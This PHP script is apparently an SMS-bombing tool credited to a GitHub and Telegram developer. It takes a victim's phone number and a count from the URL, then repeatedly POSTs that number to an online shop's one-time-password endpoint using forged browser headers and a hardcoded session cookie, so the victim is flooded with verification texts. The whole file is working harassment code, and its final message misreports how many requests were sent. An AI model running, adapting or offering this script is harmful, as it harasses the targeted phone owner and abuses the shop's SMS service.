<?php
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//Strings
$Phone = htmlspecialchars($_GET['phone']);
$count = htmlspecialchars($_GET['count']);
$count_final = $count +1;
$full_phone = "$Phone";
//============================================================================//

//============================================================================//
//Random Function
function random($length, $type) {
if($type == "1"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "2"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "3"){
return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "4"){
return substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "5"){
return substr(str_shuffle(str_repeat($x='ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "6"){
return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )),1,$length);
}
}
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//============================================================================//
//Random Strings
$i = 1;
while($i<$count_final){
$random_ab = random("24", "1");
$PHPSESSID = random("32", "2");
$Sheypoor = random("32", "2");
$fname = random("5", "4");
$lname = random("8", "4");
$password = random("12", "1");
$email_rand = random("7", "2");
$email = "$email_rand@gmail.com";
$AccountOAuthTempID = random("23", "1");
$guid = "".random("8", "3")."-".random("4", "3")."-".random("4", "3")."-".random("4", "3")."-".random("12", "3")."";
//----------------------------------------------------------------------------//
$Sender = curl_init();
$Sender_Url = "https://www.khanoumi.com/accounts/sendotp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: www.khanoumi.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://www.khanoumi.com/accounts/authentication?redirectUrl=/",
"Content-Type: application/x-www-form-urlencoded",
"Content-Length: 34",
"Origin: https://www.khanoumi.com",
"Connection: keep-alive",
"Cookie: _ga=GA1.2.740353207.1608912982; _gid=GA1.2.1845350466.1608912982; pushNotification-shownCount-1309=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=5564f48e-ce7b-5064-9d73-7b3a5491378c; analytics_token=0d19f577-1fe6-83f5-40b1-708cb286cea2; yektanet_session_last_activity=12/25/2020; _yngt_iframe=1; _yngt=60e80e19-93148-8c9a1-1c764-42b43a41577dd; mailerlite:webform:shown:3235258=1608912987222; tlc=true; ASP.NET_SessionId=kequigaszlxokg5sji3tyicm",
"Upgrade-Insecure-Requests: 1",
"TE: Trailers",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$Phone.'&redirectUrl=%2F');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
$i++;
}
//============================================================================//
//Create Count Final
$all_request = $count * 40;
//============================================================================//
echo "$all_request OK Sended
";
//============================================================================//
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//============================================================================//
?>